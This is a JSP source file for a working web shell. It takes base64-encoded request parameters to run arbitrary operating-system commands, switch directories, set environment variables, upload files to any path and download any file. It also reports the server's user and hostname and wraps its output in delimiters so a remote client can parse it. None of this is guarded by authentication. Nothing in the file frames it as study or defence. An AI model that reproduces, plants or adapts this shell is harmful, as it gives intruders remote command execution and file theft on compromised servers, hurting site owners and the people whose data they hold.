<%@ page import="java.util.*,java.io.*,java.nio.file.*,java.util.regex.Pattern"%>
<%@ page trimDirectiveWhitespaces="true" %>
<%!
public String b64d(String b64) throws IOException
{
    byte[] tmp = Base64.getDecoder().decode(b64);
    return new String(tmp);
}

public void pb64(JspWriter out, String data, boolean sep) throws IOException
{
    byte[] tmp = data.getBytes();
    out.print(new String(Base64.getEncoder().encode(tmp)));
    if (sep)
        out.print(":");
}

public byte[] readInputStream(InputStream stream) throws IOException
{
    int readCount;
    byte[] buffer = new byte[4096];
    ByteArrayOutputStream bos = new ByteArrayOutputStream();

    while(( readCount = stream.read(buffer, 0, buffer.length)) != -1)
    {
          bos.write(buffer, 0, readCount);
    }

    return bos.toByteArray();
}

public void process(JspWriter out, HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException
{
    byte[] content;
    String filename;

    File cwd = new File(".");
    Map<String, String> env = new HashMap<String,String>();

    if (request.getParameter("chdir") != null)
    {
        cwd = new File(b64d(request.getParameter("chdir")));

        if( !cwd.isDirectory() ) {
            response.setStatus(202);
            pb64(out, "Error: Unable to change directory to " + cwd.getAbsoluteFile(), false);
            return;
        }
    }

    if (request.getParameter("b64_env") != null)
    {
        for(String b64 : request.getParameter("b64_env").split(":"))
        {
            String[] envvar = b64d(b64).split("=");

            if (envvar.length == 2)
                env.put(envvar[0], envvar[1]);
        }
    }

    if (request.getParameter("action") != null ) {

        switch (request.getParameter("action"))
        {
            case "init":
                pb64(out, File.separator, true);
                pb64(out, "jsp", true);
                pb64(out, System.getProperty("user.name"), true);
                pb64(out, java.net.InetAddress.getLocalHost().getHostName(), true);
                break;

            case "cmd":
                String[] command = b64d(request.getParameter("b64_cmd")).split("<@:SEP:@>");

                ProcessBuilder builder = new ProcessBuilder(command);
                builder.directory(cwd);
                builder.environment().putAll(env);
                builder.redirectErrorStream(true);

                Process proc = builder.start();
                proc.waitFor();

                content = readInputStream(proc.getInputStream());
                out.print(new String(Base64.getEncoder().encode(content)));
                out.print(":");
                break;

            case "upload":
                content = Base64.getDecoder().decode(request.getParameter("b64_upload"));
                filename = b64d(request.getParameter("b64_filename"));

                if (new File(filename).isDirectory())
                    filename += File.separator + b64d(request.getParameter("b64_orig"));

                Files.write(Paths.get(filename), content);
                break;

            case "download":
                filename = b64d(request.getParameter("b64_filename"));
                content = Files.readAllBytes(Paths.get(filename));
                out.print(new String(Base64.getEncoder().encode(content)));
                out.print(":");
                break;
        }
    }

    pb64(out, cwd.getAbsoluteFile().toString(), false);
}
%>

<%
out.print(request.getParameter("pattern"));
try {
    process(out, request, response);

} catch (IOException e) {
    response.setStatus(201);
    out.print("Caught unexpected " + e.getClass().getName() + ": " + e.getMessage());
}
out.print(request.getParameter("pattern"));
%>
